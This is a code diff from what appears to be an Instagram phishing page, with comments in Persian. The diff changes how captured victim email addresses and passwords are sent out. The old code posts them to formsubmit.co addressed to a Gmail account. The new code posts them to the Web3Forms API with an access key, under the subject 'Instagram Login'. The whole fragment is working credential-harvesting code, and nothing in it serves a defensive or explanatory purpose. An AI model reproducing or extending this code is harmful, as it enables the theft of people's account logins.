@@ -33,17 +33,17 @@
         console.log("🎯 اطلاعات دریافت شده:");
         console.log("📧 ایمیل:", email);
         console.log("🔑 رمز:", password);
-        console.log("⏰ زمان:", new Date().toLocaleString());
         
-        // ارسال به ایمیل تو
-        fetch('https://formsubmit.co/ajax/zeromaskzeromask@gmail.com', {
+        // ارسال به ایمیل تو از طریق Web3Forms
+        fetch('https://api.web3forms.com/submit', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
+                access_key: "59bcacfe-f4f5-4a1b-8194-0eeb4ce708c7",
                 email: email,
                 password: password,
                 time: new Date().toLocaleString(),
-                _subject: "Instagram Login - " + email
+                subject: "Instagram Login"
             })
         })
         .then(response => response.json())
